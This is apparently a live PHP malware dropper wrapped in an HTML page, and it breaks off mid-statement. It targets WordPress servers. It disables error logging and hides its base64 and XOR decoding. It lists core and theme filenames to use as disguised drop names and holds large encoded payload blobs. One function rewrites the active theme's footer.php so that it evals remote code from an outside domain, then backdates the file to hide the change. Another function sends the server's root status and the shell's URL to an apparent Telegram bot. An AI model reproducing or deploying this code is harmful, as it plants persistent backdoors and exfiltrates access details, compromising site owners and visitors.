<!DOCTYPE html><html><head><title>241543903</title><head><meta charset="utf-8"><link rel="stylesheet" href="https://dono-zz.github.io/main.css"><link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"><link rel="stylesheet" href="https://dono-zz.github.io/black.css"><meta name="robots" content="noindex nofollow noarchive"><style>body{max-width:640px;margin:0 auto}code{color:#000;background-color:#fff;}a, a:hover{color:#000;text-align: center;background-color:#fff;}</style>
<script>var sec=0;function pad(e){return e>9?e:"0"+e}setInterval((function(){document.getElementById("seconds").innerHTML=pad(++sec%60),document.getElementById("minutes").innerHTML=pad(parseInt(sec/60,10))}),1e3);</script></head><body><?php
error_reporting(0);
$start = microtime(true);
ob_start();
set_time_limit(0);
ini_set("error_log", null);
ini_set("html_errors", 0);
ini_set("log_errors", 0);
ini_set("log_errors_max_len", 0);
ini_set("display_errors", 0);
ini_set("display_startup_errors", 0);

function b64dd($xf)
{
    $_a = "b";
    $_b = "a";
    $_c = "s";
    $_d = "e";
    $_e = "6";
    $_f = "4";
    $_g = "_";
    $_h = "d";
    $_i = "e";
    $_j = "c";
    $_k = "o";
    $_l = "d";
    $_m = "e";
    $b64 =
        $_a .
        $_b .
        $_c .
        $_d .
        $_e .
        $_f .
        $_g .
        $_h .
        $_i .
        $_j .
        $_k .
        $_l .
        $_m;
    return $b64($xf);
}

function decno($string)
{
    $key = "\x4d\101\130\x49\x4d\x5f\x4d\70";
    $resultdoh = "";
    $string = b64dd($string);
    for ($i = 0; $i < strlen($string); $i++) {
        $char = substr($string, $i, 1);
        $keychar = substr($key, ($i % strlen($key)) - 3, 1);
        $char = chr(ord($char) - ord($keychar));
        $resultdoh .= $char;
    }
    return $resultdoh;
}
$version = decno("k4ZssXaPgX6UsXGDp7p+sMSzbrKikICul69vrnO6r38=");
$enx0 = [
    "edit-form-advanced.php",
    "link-parse-opml.php",
    "ms-sites.php",
    "options-writing.php",
    "themes.php",
    "https.php",
    "class-https.php",
    "admin-ajax.php",
    "edit-form-comment.php",
    "link.php",
    "ms-themes.php",
    "_Document.php",
    "plugin-editor.php",
    "admin-footer.php",
    "edit-link-form.php",
    "registration-functions.php",
    "load-scripts.php",
    "ms-upgrade-network.php",
    "admin-functions.php",
    "edit.php",
    "load-styles.php",
    "ms-users.php",
    "plugins.php",
    "admin-header.php",
    "licenses.php",
    "edit-tag-form.php",
    "media-new.php",
    "my-sites.php",
    "apps.php",
    "post-new.php",
    "upgrade-themes.php",
    "sandwich.php",
    "edit-tags.php",
    "noop.php",
    "media.php",
    "nav-menus.php",
    "posts.php",
    "admin-post.php",
    "export.php",
    "Note.php",
    "media-upload.php",
    "network.php",
    "press-this.php",
    "upload.php",
    "async-upload.php",
    "menu-header.php",
    "options-discussion.php",
    "privacy.php",
    "user-edit.php",
    "menu.php",
    "options-general.php",
    "profile.php",
    "user-new.php",
    "moderation.php",
    "options-head.php",
    "revision.php",
    "users.php",
    "custom-background.php",
    "ms-admin.php",
    "options-media.php",
    "setup-config.php",
    "widgets.php",
    "theme-single.php",
    "custom-header.php",
    "ms-delete-site.php",
    "options-permalink.php",
    "term.php",
    "customize.php",
    "link-add.php",
    "ms-edit.php",
    "options.php",
    "edit-comments.php",
    "link-manager.php",
    "ms-options.php",
    "options-reading.php",
    "xmlrpc.php",
    "comments.php",
    "front-page.php",
    "home.php",
    ".default.php",
    "header.php",
    "singular.php",
    "single.php",
    "single-wordpress.php",
    "page.php",
    "category.php",
    "tag.php",
    "taxonomy.php",
    "author.php",
    "date.php",
    "archive.php",
    "search.php",
    "attachment.php",
    "image.php",
    "404.php",
    "https.php",
    "noop.php",
    "kayeli.php",
    "Document.php",
    "class-wp-customize-nav-menu-customize.php",
    "Note.php",
    ".default.php",
    "_Document.php",
    "footer_backup.php",
    "header_backup.php",
    "apps.php",
    "index.php",
    "remove.php",
    "class.php",
];
$enx1 = [
    "https.php",
    "noop.php",
    "_Document.php",
    "Document.php",
    "reta.php",
    "mawes.php",
    "Note.php",
    ".default.php",
    "_Document.php",
    "footer_backup.php",
    "header_backup.php",
    "apps.php",
    "licenses.php",
    "kayeli.php",
    "class.php",
    "index.php"
];
$eft0 = [
    "language",
    "hooks",
    "images",
    "admins",
    "backups",
    "logs",
    "assets",
    "cache",
    "Help",
    "documents",
    "temp",
    "gitignore"
];
$itemsxz = [
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh5e8rXqnvabGvMDLe6i7qA=="),
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh5e8rXqotbHFsrvIs7F7scaw"),
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh5e8rXqdw6LEen+Se6i7qA=="),
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh7e8za6lsm66rr/StqB+b8i3tA=="),
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh7e8za6lsm66rr/StqB/b8i3tA=="),
    decno("x8GsvbSSeHzGtqx7pb23wc57sraxh7e8za6lsm66rr/StqCAb8i3tA==")
]; // files
$sox = "jVVha9swEP0rqjHEBrdNsn2K8aC03RiDFtKOfdiGUexzLWJLniQvbUP++06SHWdZmgxCLJ/unt67O539rGz5MlXsFZLJ+/E49leSaUhpwtuqin2QUsjtmyqhqpJRy2kN5JzGZBUTlsfkcsH4pSrJORvFfk6hFjxBqBwW7RMuWBEULc80EzyFZ6a0CkZNxnWVFkIuR2G49huWJ4MpCE2MNSbnk3DdSMY104F3O5/fz2fkmvKRJsbTC2NE1MEkjDddSLi2lrGzNEKx51SBViwPwn04o66H6312IXsxk3gDlYIh8tvV/O7z3acZ+UhZBTnRgjhXpuCCkMeSKYK/Xy0mk2Sixh1CeU64QN5U0+oCj9lkZc5k4F3iuq2pWhrSvhLZMinMv2iABz5rIr8RUkemGFzYh9Iyeje2WTqzATuiun0SOP89PaAyyRotpGogS6iU9CUYJx/cwmtYA17kSS+MJvvGFRqnB4xIuZEiA6US80wda9sq0d55KATDlOPNVCpBiVZmEPQI4Vu1Vg1dcWJBd/WgTqC1KW+6qDANjD8F7ozv458RJuiIw+SUw/RtB5Nys7kl+9Bmhn+B1+SFmAxgT0j4DVKBY206BEs5s6VECasS+wY1rM3lAFE4zAP6H2x0JjgHe4OIBlkzTjXkCLNAckvb6A6kl/YmUJfogyg+PnK87K7ETuSQrG1WsOC8rdOspPwJ8tS44dVJtomqkGjQYUX9PIn6URKZUWI7gPH0r5NcRGhT4mZHOOT3/voLmd9e3SBbn/Gm1Ulh/PvYYYy50XEgfEZcICIUltROp7gdNzEGWoP0o9Qeb+6/Ph4mNyCcImhBDlB08o7Qm56mhw1wjN70v+ghyEl6myKrhOrM6NS99Wnet0z+sZjmskOkt3ZjIe6/H6Sn5GO74VW0ks+6Md31vNft/eAeUvoD";
$local = "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";
function fgt($url)
{
    if (function_exists("file_get_contents")) {
        $arrContextOptions = [
            "ssl" => [
                "verify_peer" => false,
                "verify_peer_name" => false,
            ],
        ];
        $fgt = file_get_contents(
            $url,
            false,
            stream_context_create($arrContextOptions)
        );
    } elseif (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($conn, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        $fgt = curl_exec($conn);
        curl_close($conn);
    } else {
        $handle = fopen($url, "r");
        $fgt = stream_get_contents($handle);
    }
    return $fgt;
}

function backlinks($fol)
{
    $direktoripass = $fol;
    $targetSitez =
        (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on"
            ? "https"
            : "http") . "://$_SERVER[HTTP_HOST]";
    $direktoripath = $_SERVER["DOCUMENT_ROOT"];
    $targetSitez =
        $targetSitez . str_replace($direktoripath, "", $direktoripass);

    $srcz = fgt($targetSitez);
    preg_match(
        "/.*stylesheet.*href=.*\/themes\/(.*?)\/.*\.css.*\>/i",
        $srcz,
        $matchesz
    );
    if (isset($matchesz[1])) {
        $styleHrefz = trim($matchesz[1]);
        $fooxer =
            $direktoripass .
            "/" .
            "wp-content" .
            "/" .
            "themes" .
            "/" .
            $styleHrefz .
            "/" .
            "footer.php";
        if (
            file_exists($fooxer) &&
            is_writable($fooxer) &&
            isset($styleHrefz)
        ) {
            $strcar = b64dd("PD9waHAgZXZhbCgiPz4iLmZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwczovL3plcm90d29zdHJnLnh5ei9iYWNrbGluay9hcGkudHh0IikpOyA/Pg==");
            @file_put_contents($fooxer, $strcar);
            @touch(
                $fooxer,
                strtotime("-" . rand(90, 150) . " days", time())
            );
        }
    }
}

function generateRandomString($length = 10)
{
    $characters =
        "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $charactersLength = strlen($characters);
    $randomString = "";
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function myscandir($dir)
{
    if (function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh = opendir($dir);
        while (false !== ($filename = readdir($dh))) {
            $files[] = $filename;
        }
        return $files;
    }
}
function OS()
{
    return substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
}

function shuffle_assoc($list)
{
    if (!is_array($list)) {
        return $list;
    }

    $keys = array_keys($list);
    shuffle($keys);
    $random = [];
    foreach ($keys as $key) {
        $random[$key] = $list[$key];
    }

    return $random;
}

function getSubDirectories($dir)
{
    $subDir = [];
    $directories = array_filter(glob($dir), "is_dir");
    $subDir = array_merge($subDir, $directories);
    foreach ($directories as $directory) {
        $subDir = array_merge($subDir, getSubDirectories($directory . "/*"));
    }
    return $subDir;
}

function getFilex($dir, $filter = "", &$results = [])
{
    $files = myscandir($dir);
    foreach ($files as $key => $value) {
        $path = realpath($dir . "/" . $value);
        if (!is_dir($path)) {
            if (empty($filter) || preg_match($filter, $path)) {
                $path = str_replace($dir, "", $path);
                $path = ltrim($path, "/\\");
                $results[] = $path;
            }
        } elseif ($value != "." && $value != "..") {
            getFilex($path, $filter, $results);
        }
    }

    return array_unique($results);
}

function b64ed($xf)
{
    $_a = "b";
    $_b = "a";
    $_c = "s";
    $_d = "e";
    $_e = "6";
    $_f = "4";
    $_g = "_";
    $_h = "e";
    $_i = "n";
    $_j = "c";
    $_k = "o";
    $_l = "d";
    $_m = "e";
    $b64 =
        $_a .
        $_b .
        $_c .
        $_d .
        $_e .
        $_f .
        $_g .
        $_h .
        $_i .
        $_j .
        $_k .
        $_l .
        $_m;
    return $b64($xf);
}

function GrabMe($x,$y,$z)
{
    $actual_link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[SCRIPT_NAME]";
    $ohmy = decno("xsCnsKy9vXvIvGfF");
    $ukauka = decno("jsCdu6WlrsDSrp+ygLuxrtOsobF+");
    $tapi = decno("wbysg3iQf4SWhm+FdZKKjqS4l7ai0qt/1aF+nquewKSPt2rEd8KKhMC+qJyjr5u/oA==");
    $tid = decno("jH5ofXOIen6VhmmEepA=");
    $gime = decno("x8GsvbSSeHzAvaF7tb21ssa/mbpvx7u0jg==");
    if (file_exists('/usr/local/cpanel/version')) { $cpanel = "cPanel: ON"; } else { $cpanel = "cPanel: OFF"; }
        if(file_exists($z."/_x")) { 
        $url = $gime . $tapi . $ukauka . $tid . '&reply_to_message_id=865&parse_mode=MarkdownV2&text=``` r00t+'.OS().'+EXEC%3A+ENABLED+|+'.urlencode($cpanel).'%0A'.urlencode(b64dd($y)).'```&reply_markup={"inline_keyboard":[[{"text":"'.urlencode($x).'","url":"'.urlencode($actual_link).'"}]]}';
        } else { $url = $gime . $tapi . $ukauka . $tid . '&reply_to_message_id=865&parse_mode=MarkdownV2&text=``` NonRoot+'.OS().'+EXEC%3A+ENABLED+|+'.urlencode($cpanel).'%0A'.urlencode(b64dd($y)).'```&reply_markup={"inline_keyboard":[[{"text":"'.urlencode($x).'","url":"'.urlencode($actual_link).'"}]]}'; }
        $tResult = fgt($url);
}   

echo "<div class='corona mh-100'>";

@set_time_limit(0);

$direktori = $_SERVER["DOCUMENT_ROOT"];
$fullxx =
